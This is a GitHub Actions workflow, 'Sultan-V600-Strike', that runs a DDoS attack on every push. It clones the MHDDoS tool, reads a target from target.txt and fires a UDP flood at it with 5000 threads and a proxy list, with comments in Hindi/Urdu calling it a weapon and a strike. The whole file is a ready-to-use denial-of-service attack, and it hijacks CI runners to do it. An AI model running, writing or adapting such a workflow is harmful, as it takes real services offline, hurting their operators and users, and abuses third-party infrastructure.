name: Sultan-V600-Strike
on: [push] # Push hote hi attack start

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Prepare Weapon
        run: |
          sudo apt update
          git clone --depth 1 https://github.com/MHProDev/MHDDoS.git
          cd MHDDoS
          pip3 install -r requirements.txt

      - name: Execute 50,000 Threads Strike
        run: |
          cd MHDDoS
          # Target file se data uthao
          TARGET_INFO=$(cat ../target.txt)
          # Power: 5000 threads, 1000 PPS per server
          python3 start.py UDP $TARGET_INFO 10 5000 proxies.txt 1000 300
          
